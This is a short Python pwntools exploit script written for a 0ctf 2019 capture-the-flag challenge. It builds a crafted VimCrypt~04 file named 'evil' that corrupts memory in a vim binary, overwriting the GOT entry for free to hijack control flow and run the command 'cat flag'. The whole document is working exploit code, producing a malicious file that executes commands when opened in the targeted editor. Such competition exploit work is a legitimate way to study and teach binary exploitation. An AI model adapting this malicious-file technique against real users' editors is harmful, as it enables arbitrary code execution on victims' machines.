#Filename: exp.py
#Data: 2019-04-14
#Author: raycp
#Description: exp for If_on_a_winters_night_a_traveler of 0ctf 2019

from pwn import *

e = ELF('./vim')

_size = 0x16 + 8 + 1 + 8 + 8
size = 0x35
IV = 0xffffffff ^ 0x61

f = "VimCrypt~04!"
f += p32(IV)[::-1]

p = 'y' * 0x15
p += p64( e.got['free'] - 9 )[::-1]
p += '\x1b'
p += p64( 0x4C915d )[::-1]
p += 'cat flag'.ljust( 9 , '\0' )[::-1]
f += p.ljust( size , '\x00' )

fd=open('evil','wb')
fd.write(f)
fd.close()
